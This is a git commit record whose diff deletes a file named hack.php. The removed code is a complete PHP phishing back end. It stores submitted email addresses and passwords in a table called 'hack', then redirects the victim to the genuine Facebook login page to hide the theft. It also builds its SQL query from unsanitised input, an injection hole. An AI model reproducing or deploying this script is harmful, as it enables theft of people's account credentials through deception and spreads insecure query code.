c564b606b6a8a3c8b6c3208b084e58cae8ad9554
eyepatchers123 <61273044+eyepatchers123@users.noreply.github.com>
2020-02-24 18:36:15 +0800

    Delete hack.php

--- hack.php
+++
@@ -1,8 +0,0 @@
-<?php
-	
-	$email=$_REQUEST['email'];
-	$pass=$_REQUEST['pass'];
-	$query="INSERT INTO `hack` VALUES ('$email','$pass')";
-	$result=$mysqli->query($query);
-	header('Location:https://www.facebook.com/login.php?login_attempt=1');
-?>
